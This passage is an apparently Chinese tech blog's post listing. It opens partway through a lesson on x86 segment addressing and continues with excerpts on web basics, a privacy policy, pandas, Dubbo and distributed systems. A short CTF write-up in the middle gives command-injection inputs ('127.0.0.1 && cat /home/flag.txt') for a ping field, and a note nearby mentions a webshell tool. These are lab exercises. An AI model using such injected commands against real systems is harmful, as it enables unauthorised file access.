(1) CPU中的相关部件提供两个16位的地址，一个称为段地址，另一个称为偏移地址；
(2)段地址和偏移地址通过内部总线送入一个称为地址加法器的部件;
(3)地址加法器将两个16位地址合成为一个20位的物理地址;
(4)地址加法器通过内部总线将20位物理地址送入输入输出控制电路;
(5)输入输出控制电路将20位物理地址送上地址总线;
(6)20位物理地址被地址总线传送到存储器。
动图演示如下：
地址加法器采用物理地址=段地址x16+偏移地址的方式合成物理地址，其思想和上述例子中找图书馆的位置时如出一辙的，只不过从10进制变成了计算机的16进制。
当个体受限时，借助外力以及互相配合则显得尤为重要！
君子性非异也，善假于物也。——荀子
两点注意:
（1）段地址×16必然是16的倍数，所以一个段的起始地址也一定是16的倍数;
（2）偏移地址为16位，16位地址的寻址能力为64KB，所以一个段的长度最大为64KB。
总结 CPU将若干地址连续的内存单元看作一个段，用段地址x16定位段的起始地址(基础地址)，用偏移地址定位段中的内存单元；物理地址=段地址x16+偏移地址
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d98540a72867b0ca602e76ca11825780/" rel="bookmark">
			前端学习之HTML、CSS、JavaScript
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、HTML标签 1.meta标签：2.div标签，分割标签：3.p标签，段落标签：4.h标签，标题标签h1-h6：5.列表标签 &lt;ul&gt; &lt;ol&gt; &lt;dl&gt;：6.img标签，展示图片：7.a标签，超链接标签：8.audio和video，音频标签和视频标签：9.span标签，区块标签不会自动换行：10.form标签，表单标签：11.table标签，表格标签： 二、CSS样式 1.CSS书写位置：2.选择器：3.文本与字体属性4.段落和行相关属性5.盒子模型6.浮动用来实现并排7.定位设置8.边框与圆角9.背景、透明、阴影、渐变、过渡、动画 三、JavaScript 1.书写位置：2.输出语句3.数据类型4.文档对象模型DOM5.浏览器对象模型BOM6.面向对象7.ES68.本地存储9.Ajax请求 四、其他 一、HTML标签 1.meta标签： Keywords关键词和Description描述信息，这两个属性主要用于SEO优化2.div标签，分割标签： 用来将相关的内容组合到一起，和其他的内容进行分割clss属性主要用于和css进行关联 3.p标签，段落标签： p代表一个段落 ，不会进行换行4.h标签，标题标签h1-h6： h1最大,h6最小5.列表标签 &lt;ul&gt; &lt;ol&gt; &lt;dl&gt;： &lt;ul&gt;无序列表： type：disc(默认，实心原点),square(实心方点),circle(空心圆)&lt;li&gt;列表项标签，里面可以放任何标签&lt;ol&gt;有序列表： type： 值 1(默认),a,A,i,I start： 从几开始&lt;li&gt;列表项标签，里面可以放任何标签reversed属性，倒序排列&lt;dl&gt;定义列表： &lt;dt&gt;数据项&lt;dd&gt;数据定义，可以嵌套任何标签，比如：span标签、em标签、a标签等等常用CSS样式： list-style: none; //去掉无序列表的小圆点6.img标签，展示图片： src属性，代表图片路径，有两种格式： 绝对路径: http://www.baidu.com/logo.png相对路径: 相对本文件所在的文件夹，./可以不写width和height属性，单位是像素可以不用写，如果省略其中一个属性，则等比例缩放图片alt属性，对图像的文本描述，当图片显示有问题时的代替文本图片格式： .jpg/.jpeg有损压缩图片，用于照片.png用于logo、背景图等，支持透明和半透明.gif支持动画（表情包） 7.a标签，超链接标签：
href属性： 表示点击后跳转的页面，还可以连接到本页面或者其他页面的特定位置 href = "a.html#a" 定位到a.html这个超链接的name = "a"属性；target属性： 表示点击后网页在哪一个位置显示 ，self 在本页面打开页面， blank 在新页面打开页面title属性，用于设置鼠标的悬停文本常用CSS样式： text-decoration: none; //去掉超链接的下划线8.audio和video，音频标签和视频标签： src属性，表示音频地址controls属性，显示播放控件标签对里的文字是对不兼容audio标签的浏览器显示文字常用音频格式，mp3、ogg常用的视频格式，mp4、ogv、webm9.span标签，区块标签不会自动换行： 没有特殊的显示效果，一般是结合css来丰富字体样式10.form标签，表单标签： action属性: 表示你要把数据提交到服务器，写的是网络地址(url)method属性: 表示提交数据的方式 get(默认方式):就是我们刚刚试的,把数据直接拼接到地址后面提交,特点是不安全,而且长度是有限制post:是把用户数据打包后提交,在地址栏上是看不见,相对于get方式更多安全input标签，type属性表示类型，required属性代表必填单行文本框，input标签的type属性设置为text： text属性：文本输入域,显示的文本内容(20个字符),默认的value属性：表示已经填好的值placeholder属性：表示提示文本，以浅色文字写在文本框中，并不是文本框的值disables属性：文本框锁死，不与用户交互，只做展示单选按钮，input标签的type属性设置为radio： radio是收音机的意思，老式收音机当你按下一个按钮的时候，其他按钮会自动弹起互斥的单选按钮应该设置他们的name为相同的值单选按钮要有value属性值，向服务器提交的就是该值如果加上了checked属性，表示默认被选中label标签，将文字和单选按钮进行绑定，当点击文字的时候也可以选中单选框复选框，input标签的type属性设置为checkbox： checkbox:复选框密码框，input标签的type属性设置为password： password:密码输入框,显示的是*号代替文本下拉菜单，select标签： option标签是内部的选项，value属性的值会被提交到服务器 多行文本框，textarea标签： rows和cols属性，用于定义多行文本框的宽和高三种按钮，input标签的type属性值不同： button:普通按钮，也可以简写成button标签reset:重置按钮，表单的value会被重置 submit:提交按钮，表单会被提交到服务器，路由到action的url更丰富的input种类，input标签的type属性值不同： color颜色选择控件date、time日期、时间选择控件email电子邮箱输入控件file文件选择控件number数字输入控件range拖拽条search搜索框url网址输入控件datalist控件，为输入框提供一些备选项，当用户输入和备选项类似时，就会显示相应的11.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d98540a72867b0ca602e76ca11825780/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e0b1fd7cc471b92c9ee22276ce77a84/" rel="bookmark">
			坦程盒子隐私政策
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		《坦程盒子隐私政策》（以下简称“本隐私政策”）适用于坦程物联网股份有限公司及其关联公司（以下称“本公司”或“我们”）的坦程盒子产品或服务（以下称“坦程盒子”或“本软件”或“应用”）。我们非常重视用户的隐私和个人信息保护。您在使用我们的产品与/或服务时，我们可能会收集和使用您的相关信息。我们希望通过本隐私政策向您说明我们在您使用我们的产品与/或服务时如何收集、使用、保存、共享和转让这些信息，以及我们为您提供的访问、更新、删除和保护这些信息的方式。 本政策将帮助您了解以下内容：
一、我们如何收集和使用您的个人信息
二、我们如何使用 Cookie 和同类技术
三、我们如何处理、共享、转让、公开披露您的个人信息
四、我们如何保护您的个人信息
五、我们如何保存您的个人信息
六、您如何管理您的个人信息
七、未成年人信息的保护
八、隐私政策的通知和修订
九、接入第三方SDK目录
十、如何联系我们
本隐私政策与您所使用的本公司产品与/或服务以及该服务所包括的各种业务功能（以下统称“我们的产品与/或服务”）息息相关。您在使用我们的产品与/或服务前，请您务必仔细阅读并透彻理解本政策 ，特别是以粗体/粗体下划线标识的条款，您应重点阅读，在确认充分理解并同意后再开始使用。如果您对本政策有任何意见或建议，请根据本政策联系我们章节中列明的联系方式与我们取得联系。
一旦您开始使用我们的产品或服务，即表示您已经充分阅读、理解并同意本隐私政策。我们将按照本隐私政策处理您的个人信息，向您提供相关的产品或服务。如果您不同意本隐私政策的任何内容，您应立即停止使用我们的产品或服务。
一、我们如何收集和使用您的个人信息
我们会根据合法正当、必要、透明的原则，基于本政策所述的目的，收集和使用您的个人信息。如果我们将您的个人信息用于本政策未载明的其它用途，或基于其他特定目的而收集您的个人信息，我们将以合理的方式告知您，并在使用前再次征得您的同意。
（一）为完成基本业务功能，您须授权我们收集和使用您个人信息的情形
我们的产品与/或服务包括基本业务功能和扩展业务功能。基本业务功能包含用户注册与登录、车辆管理、支付功能、设备绑定、设备新装、设备续费、设备报修、车辆定位，改进我们的产品与/或服务及保障交易安全所必须的功能。我们需要收集、保存和使用上述与您有关的信息才能实现上述基本业务功能。如果您不提供相关信息，您将无法享受我们提供的产品与/或服务。
1、用户注册与登录
为了使用我们的产品与/或服务，您需要注册坦程盒子账户。当您注册坦程盒子账户时，您需要向我们提供坦程盒子账户名、密码、您本人的手机号码、姓名或公司名称信息。如果您不提供上述信息，则无法注册坦程盒子账户、使用坦程盒子产品与/或服务。
2、车辆管理
为了对车辆进行管理、保障车辆功能的正常使用，我们需要获取您的姓名、身份证、驾驶证。如果您不提供上述信息，我们则无法验证您的身份，您将无法对车辆进行管理。
3、支付功能
在您下单后，您需要使用坦程盒子合作的第三方支付机构（包括信联支付、环迅支付、微信支付和支付宝支付，以下称“支付机构”）所提供的支付服务。为完成支付，我们需要获取您的银行账户信息、订单信息以及交易状态信息。
4、设备绑定、新装、续费
当您使用设备绑定、新装、续费服务时，我们可能会收集您的相机和相册信息，用于识别行驶证信息，以快速获取车辆信息：车牌号，车型，车长，车牌号种类，车品牌型号，车架号，发动机号信息信息。如果您不提供上述信息，则无法通过扫一扫或上传照片自动填充车牌号，且我们将因为无法判定车辆是否属于您所有而无法为您提供车辆绑定、新装、续费服务。
5、设备报修
当您使用设备报修服务时，我们可能会收集您的相机和相册信息，用于采集并上传行驶证、故障照片等。如果您不提供上述信息，则可能会影响售后工程师对故障的判断准确性。
6、车辆定位功能
当您使用车辆定位的服务时，我们可能会收集您的位置信息，用于以您定位去查看周围车辆。如果您不提供上述信息，则地图自适应比例尺展示所有车辆位置。
（二）为完成扩展业务功能，您可选择是否授权我们收集和使用您的个人信息的情形
为了更好的提供服务，我们提供多元化的产品与服务。在以下附加功能中，我们可能会额外地收集和使用您的个人信息。如果您不提供这些个人信息，您依然可以使用前述的核心功能，但您可能无法使用这些可以为您所带来丰富体验的附加功能。
1、副卡充值
为了方便管理副卡充值功能，我们需要获取您的联系电话，用于生成您的授权登录对象。如果您不提供上述信息，则无法使用副卡充值功能。
2、石化油站
当您使用石化油站服务时，我们可能会收集您的位置信息，用于为您提供附近的油站信息。如果您不提供上述信息，则将无法查看附近的加油站。
3、客服与售后功能
当您与我们的电话客服或在线客服进行沟通时，为保证您的账号安全，我们的客服人员可能会要求您提供您的姓名、手机号码、配送地址信息，以便我们核验您的身份。当您需要我们提供与您订单相关的客服与售后服务时，我们将会查询您的订单信息，并可能会要求您提供联系人姓名、联系人手机号码、配送地址信息。
（三）用于维护所提供的产品或服务的安全稳定运行所必需的信息
为了维持App的正常运行、保障账号安全并预防钓鱼网站欺诈，需要获取您的与您的设备信息，包括IMEI、IMSI、WIFI SSID名称、MAC地址信息。
（四）所调用的系统权限
经过您对设备系统权限的授权，我们会收集该权限所涉的信息，并提供与之相应的服务。您可以选择是否授权我们使用您设备的相关权限，如果您不授权我们使用相关权限，可能会导致部分功能与/或服务无法使用，但是不影响您使用坦程盒子的其他功能。
1、位置权限
当您同意开启此项权限后，我们会收集您的精确位置信息。如果您拒绝该项授权，前述功能将无法正常使用，我们也将不再继续收集和使用您的这些个人信息。
2、摄像头权限
当您同意开启此项权限后，我们会使用您设备上的摄像头功能，并收集您使用摄像头拍摄的影像。此项收集的信息将用于视频拍摄、拍照、扫码功能。
3、相册权限
当您同意开启此项权限后，我们会使用您设备上的相册功能，并在您选择上传图片或视频时，读取您设备相册内的图片和视频文件；或在您在App中选择保存图片或视频时，将您选择的图片或视频保存至您的相册。此项收集的信息将用于头像、绑定车辆、新装、续费、报修、使用反馈功能，目的在于方便您上传图片或视频，帮助我们更清楚地了解您的报修和使用情况。如果您拒绝该项授权，前述功能将无法正常使用，我们也将不再继续收集和使用您的这些个人信息。
4、蓝牙权限
当您同意开启此项权限后，我们会使用您设备上的蓝牙功能。此项收集的信息将用于ETC圈存功能，目的在于读取速通卡信息，我们不会收集您的信息。如果您拒绝该项授权，则无法使用ETC圈存功能。
5、软件列表权限
当您同意开启此项权限后，我们会使用您设备上的与第三方接入SDK相关的功能。此项收集的信息将用于百度地图定位。如果您拒绝该项授权，则无法使用第三方SDK的功能。
6、设备MAC地址权限
当您同意开启此项权限后，我们会使用您设备上的与第三方接入SDK相关的功能。此项收集将用于第三方SDK接入分享。如果您拒绝该项授权，则无法使用第三方SDK的功能。
（五）根据相关法律法规及国家标准，以下情形中，我们可能会收集、使用您的相关个人信息无需征求您的授权同意：
1、与国家安全、国防安全等国家利益直接相关的；
2、与公共安全、公共卫生、公众知情等重大公共利益直接相关的；
3、与犯罪侦查、起诉、审判和判决执行等直接相关的；
4、出于维护个人信息主体或其他个人的生命、财产等重大合法权益但又很难得到您本人同意的；
5、所收集的个人信息是您自行向社会公众公开的；
6、从合法公开披露的信息中收集的您的个人信息的，如合法的新闻报道、政府信息公开等渠道；
7、根据您的要求签订合同和履行相关协议或其他书面文件所必需的；
8、其他用于维护所提供的产品与/或服务的安全稳定运行所必需的个人信息，例如发现、处置产品与/或服务的故障所必需的个人信息；
9、为合法的新闻报道所必需的；
10、基于公共利益开展统计或学术研究所必要，且对外提供学术研究或描述的结果时，对结果中所包含的个人信息进行去标识化处理的；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e0b1fd7cc471b92c9ee22276ce77a84/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a4d220d5e2b23a3893bf8d1176651a22/" rel="bookmark">
			用C语言来看“流星雨”，听说向流星许愿就会有好运气
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		序 再亮眼的流星，也会一闪而过。
嗨！这里是狐狸~~ 没错，我又来了，上次的“烟花”表白程序你学废了吗，这次我次我又来给大家支招啦，学会了“烟花”，我们一起来看“流星雨”吧！！！ 直接上界面
上次忘记说了，因为我们是用C语言写的所以是控制台程序，创造不出来界面，那怎么办呢，我们就要用Windows的远房表亲EasyX图形库来建界面了，上次忘记说了，望谅解！！！
我们今天就和往常一样一步一步的教大家如何去完成这个“流星雨”表白程序吧！
一、头文件 最近总是被吐槽为什么没有头文件，原因是呢，我觉得我分享项目最主要的目的是让大家学知识，头文件这些没营养的，开始就没有考虑，但鉴于需要的小伙伴太多了，我就发出来吧！！！
#include&lt;stdio.h&gt; #include&lt;easyx.h&gt;	//第三方图形库，需要安装 #include&lt;time.h&gt; #include&lt;conio.h&gt; #include&lt;mmsystem.h&gt; #pragma comment(lib,"winmm.lib") 二、结构体 老朋友结构体他又来了，不用多说，直接看
struct Star	//小星星 { int x; int y; int r; int speed;	//速度 COLORREF color;	//颜色 }; struct Meteor { int x; int y; int speed; }; 三、初始化 初始化星星以及流星，要用到随机函数哦，让星星和流星看起来更自然。
//初始化星星 void initStar(int i) { star[i].x = rand() % getwidth(); star[i].y = rand() % getheight(); star[i].r = rand() % 3 + 1; star[i].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a4d220d5e2b23a3893bf8d1176651a22/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1c19ff23dfb51811477e471cf3d9310/" rel="bookmark">
			Mybatis-PageHelper分页参数附加到未分页查询语句
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Mybatis-PageHelper分页参数附加到未分页查询语句
报错信息 limit参数加到了不需要分页的查询语句上，并且确定此查询没有在分页中使用。
原因 PageHelper的不正确使用。PageHelper后没有紧接着查询，导致分页参数所在线程的ThreadLocal 参数没有被清除，作用在下次同个线程的请求上。
PageHelper 方法使用了静态的 ThreadLocal 参数，分页参数和线程是绑定的。
只要保证在 PageHelper 方法调用后紧跟 MyBatis 查询方法，这就是安全的。因为 PageHelper 在 finally 代码段中自动清除了 ThreadLocal 存储的对象。
参考：https://blog.csdn.net/qq_34988304/article/details/90030134
验证 在有问题的PageHelper使用后打印当前线程名、线程id，在另一个有查询数据库没有分页需求的controller中打印当前线程名、线程id
# 有问题的controller请求所在线程 当前线程名字：http-nio-8080-exec-1 当前线程的优先级别为：5 ID:35 # 省略其他日志信息 当前线程名字：http-nio-8080-exec-3 当前线程的优先级别为：5 ID:37 # 省略其他日志信息 当前线程名字：http-nio-8080-exec-4 当前线程的优先级别为：5 ID:38 # 省略其他日志信息 当前线程名字：http-nio-8080-exec-5 当前线程的优先级别为：5 ID:39 # 省略其他日志信息 当前线程名字：http-nio-8080-exec-6 当前线程的优先级别为：5 ID:40 # 省略其他日志信息 当前线程名字：http-nio-8080-exec-7 当前线程的优先级别为：5 ID:41 # 省略其他日志信息 当前线程名字：http-nio-8080-exec-8 当前线程的优先级别为：5 ID:42 # 省略其他日志信息 当前线程名字：http-nio-8080-exec-9 当前线程的优先级别为：5 ID:43 # 省略其他日志信息 当前线程名字：http-nio-8080-exec-10 当前线程的优先级别为：5 ID:44 # 省略其他日志信息，使用同一线程时报错 当前线程名字：http-nio-8080-exec-1 当前线程的优先级别为：5 ID:35 2021-11-18 19:42:59.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b1c19ff23dfb51811477e471cf3d9310/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/531f2c53afddc630eb30343dd19ac57c/" rel="bookmark">
			推荐一款易操作的固定资产管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		固定资产管理云系统是软件厂商研发的用于企业管理和盘点固定资产的软件。通常，软件厂商会引入二维码、条形码或者RIFD码，然后结合响应的扫码工具，对固定资产实行全生命周期管理和智能扫码盘点，以提升企业的固定资产管理效率，降低企业的固定资产闲置率和丢失率等。
固定资产云系统通常采用了PC+APP相结合，利用软件和硬件兼容，能将固定资产相关的数据资源存储在云空间里面，有效节省企业在服务器和软件研发的投入成本。凭借云平台进行数据存储，各级下属有关单位能够利用云平台和总部共享相关的资产管理数据，实现固定资产的统筹管理，并且云端所具有的高效扩展性能够为后期进行的扩展以及系统维护带来很大的便利。
易点易动固定资产管理系统是一款界面友好、易操作、功能齐全、通用性较高的专业固定资产管理软件。它专门为固定资产和实物资产密集型的企业和事业单位而设计。帮助企业降低采购成本，减少人员投入，协助企业实现固定资产的信息化、科学化和数字化管理。系统涵盖了固定资产、低值易耗品、附属资产、采购管理、财务管理、员工端、RFID管理等功能。采用二维码和RFID相结合的技术，使企业轻松实现全部固定资产的全生命周期管理和跟踪。包括固定资产新增、修改、领用、退库、借用、归还、维保、转移、报废、维修、折旧、报废等。实现“账、卡、物”三者相符，为企业高效管理固定资产提供强有力的保障。
易点易动固定资产管理系统的功能
1)固定资产标签管理
系统会给新入库的固定资产生成唯一的RFID或者，然后通过条码打印机打印出标签，管理员再进行粘贴。标签信息包括二维码，资产名称、资产种类、供应商等。
2)固定资产日常管理
系统中包含固定资产申购、领用、借用、维修、退回、调拨、归还、清理、报废等操作模块，可实现固定资产整个生命周期的管理。所有操作系统皆可留痕，随时追溯。
3)规范固定资产管理流程
系统对于资产日常的领用、借用、退回、调拨等作业申请，可自动生成对应的申请操作记录给到资产管理员查看，从而进行审核和驳回，规范了资产使用流程，避免了资产流失。
4)固定资产信息即时查询
系统可生成多维度分析报表，可通过固定资产台账功能，可清楚记录当前资产的使用状态，使用人，存放位置、折后价值等历史数据，可实时查看资产的更新情况，保证账、卡、物一致。
5)固定资产智能盘点管理
系统采用条码扫描的盘点方式（自动盘点，批量盘点），盘点数据实时传输到系统中，盘点更便捷，更准确，更省时。同时盘点结束后，生成盘点、盘盈和盘亏报表。
6)系统可集成其他系统
易点易动固定资产管理系统可跟其他系统进行对接，比如OA、金蝶、ERP、SAP等。系统还可集成企业微信、飞书、钉钉。同步组织结构，减少人工操作。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/719bd785472b1617cfcd9a8a88df2e51/" rel="bookmark">
			如何向 Pandas DataFrame 添加行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		您可以使用df.loc()函数在Pandas DataFrame的末尾添加一行：
#add row to end of DataFrame df.loc[len(df.index)] = [value1, value2, value3, ...] 您可以使用df.append()函数将现有 DataFrame 的几行附加到另一个 DataFrame 的末尾：
#append rows of df2 to end of existing DataFrame df = df.append(df2, ignore_index = True) 下面的例子展示了如何在实践中使用这些函数。
示例 1：向 Pandas DataFrame 添加一行 以下代码显示了如何在 Pandas DataFrame 的末尾添加一行：
import pandas as pd #create DataFrame df = pd.DataFrame({'points': [10, 12, 12, 14, 13, 18], 'rebounds': [7, 7, 8, 13, 7, 4], 'assists': [11, 8, 10, 6, 6, 5]}) #view DataFrame df points	rebounds assists 0	10	7	11 1	12	7	8 2	12	8	10 3	14	13	6 4	13	7	6 5	18	4	5 #add new row to end of DataFrame df.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/719bd785472b1617cfcd9a8a88df2e51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4eff2c041976ea22afb7092a53188c70/" rel="bookmark">
			webshell
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目
直接打开蚁剑
得到flag
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e61ed66f25cad08311fc77e3ba19541/" rel="bookmark">
			command_execution
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		看题目
1 &amp; 2 ：1和2都执行
1 &amp;&amp; 2 ：先执行1执行成功后才会执行2，1执行失败，则不执行2
1 | 2 ：只执行2
1 || 2 ：1执行失败，再执行2(若1执行成功，就不再执行2)
然后我们ping127.0.0.1
有回应，我们直接
127.0.0.1 &amp;&amp; find / -name "flag*.txt"，发现有一个flag.txt文件，最后直接cat就行了
127.0.0.1 &amp;&amp; cat /home/flag.txt
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d97318ea5da9170dc8833a7d45beb3c7/" rel="bookmark">
			分布式事务相关
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、两阶段提交方案-XA
常见的场景：1个系统操作多个数据库 基于spring+JTA就可以搞定
但是不合法，一个系统跨多个库是不合法的。。。
2、TCC方案-三阶段（写大量跟业务相关的代码 ，跟钱打交道的一般用，因为强一致），但是代码比较难维护
比如订单先插入一条流水，先查询库存服务，然后再调用库存扣减服务，再查询订单服务，如果符合库存，就认为成功，如果不符合，就调用库存回滚操作。
3、本地消息表（依赖与本地mysql表）
（1）A系统在自己本地操作业务同时，插入一条数据到消息表
（2）接着A系统将这个消息发送到MQ中去
（3）B系统在接收到消息之后，在一个是事务里 先往自己的本地消息表中插入一条数据，同时执行其他的业务，如果这个消息已经被处理过了，
那么此时这个事务会回滚，这样就保证不会重复处理消息
（4）B系统执行成功后，就会更新自己本地消息表的状态以及A系统消息表的状态（可以通过zk来监听某一个节点）
（5）如果B系统处理失败了，那么就不会通知更新A系统消息表状态，那么此时A此时就会不断重发消息，知道B成功为止。
4、可靠消息最终一致性方案 (1) A系统先发送一个prepare消息到mq,如果这个prepare消息发送失败就直接取消操作
（2）如果这个prepare消息发送成功了，那么接着执行本地事务，如果成功就告诉mq发送确认消息，如果失败就告诉mq回滚消息
（3）如果发送了确认消息 那么此时B系统会能接收到确认消息，然后执行本地事务
（4）mq会自动轮询所有prepared消息然后回调你的接口，问你这个消息是不是本地事务失败了，所以没发送确认消息？
那么是继续重试还是回滚？一般来说你可以在这个回调函数中查询下数据库看本地事务是否执行成功，如果成功，就可能是消息发送失败了，就重新发送消息就好了，如果本地事务就是失败了，那么就回滚mq中那条prepare就好了
（5）如果系统B失败了，就通知系统A不断重试，知道成功为止，，如果实在不行，那么就针对重要类业务进行回滚即可。。。
5、最大努力通知方案
有一个专门的通知服务，通过mq发送给这个通知您服务，然后在通知服务里去设置重试次数调用B系统即可。。。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c95f8cc4ded606afb60ca01103065ff/" rel="bookmark">
			限流算法相关
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、计数器算法 在一定时间内，对处理的请求数进行计数，每次到达时间临界点则计数器清零。在一定时间间隔内，若计数器数字超限，则进行限流
缺点：该算法的问题是，在两端临界点附加可能出现两倍的流速。
2、滑动窗口算法 基于计数器算法，把时间间隔分片。例如服务限流每秒处理10000个请求，把1秒分为10个窗口。每100毫秒移动一次，内存中保留每次的请求次数。每次移动判断一下总次数是否超出10000限制。
当滑动窗口的格子划分的越多，滑动窗口的滚动就越平滑，限流的统计就会越精确。
滑动窗口算法可以有效规避计数器算法中时间临界点问题。但实现起来相对比较复杂。
netflix的Hystrix和阿里的sentinel的限流都是基于滑动窗口算法实现。
3、令牌桶算法
系统已一个恒定的速率往桶放入令牌。若有请求需要处理，则从令牌桶里获取令牌，当桶里没有令牌，则拒绝服务
令牌桶算法并不能实际的控制速率。比如，10秒往桶里放入10000个令牌桶，即10秒内只能处理10000个请求，那么qps就是1000。但这种模型可以出现1秒内把10000个令牌全部消费完，即qps为10000。所以令牌桶算法实际是限制的平均流速。具体控制的粒度以放令牌的间隔和每次的量来决定。若想要把流速控制的更加稳定，就要缩短间隔时间。
Google Guava中的RateLimter就是利用的令牌桶原理。
漏桶算法 水滴先进入漏桶，漏桶以一定速度向外出水。当水流入速度过大，桶会直接溢出。
即Request进入一个固定容量的Queue，若Queue满，则拒绝新的Request，可以阻塞，也可以抛异常。
这种模型其实非常类似MQ的思想，利用漏桶削峰填谷，使得Queue的下游具有一个稳定流量。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/800f1fc5a5946f400b3432da2251c57f/" rel="bookmark">
			Dubbo相关
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		看过dubbo源码？
1、服务调用过程
最外层是Mock逻辑，调用前，调用后进行Mock 从服务目录中，根据当前调用的方法和路由链，筛选出部分服务Invoker（DubboInvoker）对服务Invoker进行负载均衡，选出一个服务Invoker执行Filter链AsyncToSyncInvoker完成异步转同步，因为DubboInvoker的执行是异步非阻塞的，所以如果是同步调用，则会在此处阻塞，知道拿到响应结果DubboInvoker开始异步非阻塞的调用 HeaderExchangeChannel中会阻塞timeout的时间来等待结果，该timeout就是用户在消费端所配置的timeout 2、限流算法
1、一般的限制每秒多少请求量 ，用信号量来做，相当于线程池
2、TPS ,Dubbo默认使用令牌桶算法实现限流。某段时间内，桶里面只能放进n个令牌，然后来一个请求就减少一个令牌，如果桶里面的令牌没有了，则不能继续执行请求。限流通过com.alibaba.dubbo.rpc.filter.TpsLimitFilter实现。
3、负载均衡算法
1、随机 a、根据权重加总计算出总权重10
b、随机一个10以内的数字
c、轮询所有的invokers,然后拿随机值offset-每一个invoker的权重
d、当结果小于0时，直接返回这个invoker即可
2、轮询（权重一样，就取余的方式获取到invoker，权重不同按照按公约后的权重设置轮循比率）
3、一致性hash（利用缓存的hash思想 每个privoder 有一个hash值存在一个圆环上,范围是0-2的32次方，然后key的hash）
4、最少活跃数（每个provider维护了一个active,调用+1 调用完成-1，轮询所有的invokers,取最小的active,如果active相同，就看权重，权重相同，就随机）
Dubbo动态代理：
1、javassist(默认)
2、jdk动态代理
JavassistProxyFactory 来创建引用服务的代理，JavassistProxyFactory 源码如下：
public class JavassistProxyFactory extends AbstractProxyFactory {
// 获取代理
public &lt;T&gt; T getProxy(Invoker&lt;T&gt; invoker, Class&lt;?&gt;[] interfaces) {
return (T) Proxy.getProx
y(interfaces).newInstance(new InvokerInvocationHandler(invoker));
}
public &lt;T&gt; Invoker&lt;T&gt; getInvoker(T proxy, Class&lt;T&gt; type, URL url) {
final Wrapper wrapper = Wrapper.getWrapper(proxy.getClass().getName().indexOf('$') &lt; 0 ? proxy.getClass() : type);
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/800f1fc5a5946f400b3432da2251c57f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70ad5d64b8e9deb8ce784f21e217c3b7/" rel="bookmark">
			【软件安装篇】conda、CUDA、cuDNN六连问
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一问：什么是conda?
答：简单来说吧conda就是一个辅助进行包管理和环境管理的工具，目前是anaconda默认的python包和环境管理工具，所以说只要你安装了anaconda,就默认你安装了conda。Conda既有pip的包管理功能，又有vitualenv的环境管理功能，所以可以简单看做是二者的结合。
参考文章链接：https://blog.csdn.net/zhanghai4155/article/details/104215198
那什么是vitualenv呢？概括地说，vitualenv就是创建虚拟环境的一个工具。因为在我们的电脑上我们可能会运行不同的项目，但是不同的项目所需的依赖版本可能不同，这样就会造成依赖冲突。而vitualenv通过创建虚拟化的python运行环境，将我们每个项目所需的依赖安装进去，这样不同项目之间就不会相互干扰了。
参考文章链接：https://blog.csdn.net/u012206617/article/details/90294421
第二问：说说conda常用的命令有哪些吧？
1.	Conda –version 或者 conda -V #查看conda版本，验证是否安装 2.	Conda updata conda #更新至最新版本，也会更新其他相关包 3.	Conda update --all #更新所有包 4.	Conda updata package_name #更新指定的包 5.	Conda create -n env_name package_name #创建名为env_name的新环境，并在该环境下装名为package_name的包。 6.	Conda create -n python2 python=python2.7 numpy pandas #创建了名为python2的新环境，python的版本号是2.7,同时还安装了numpy和pandas的包。 7.	activate env_name #切换至名为env_name的环境 (如果是os或者linux系统命令前边加source) 8.	deactivate #退出当前环境 (如果是os或者linux系统命令前边加source) 9.	Conda info -e #显示所有已经创建的环境 10.	Conda create –name new_env_name –clone old_env_name #复制名为old_env_name的环境为一个新环境并命名为new_env_name 11.	Conda remove --name env_name -all #删除环境 12.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/70ad5d64b8e9deb8ce784f21e217c3b7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
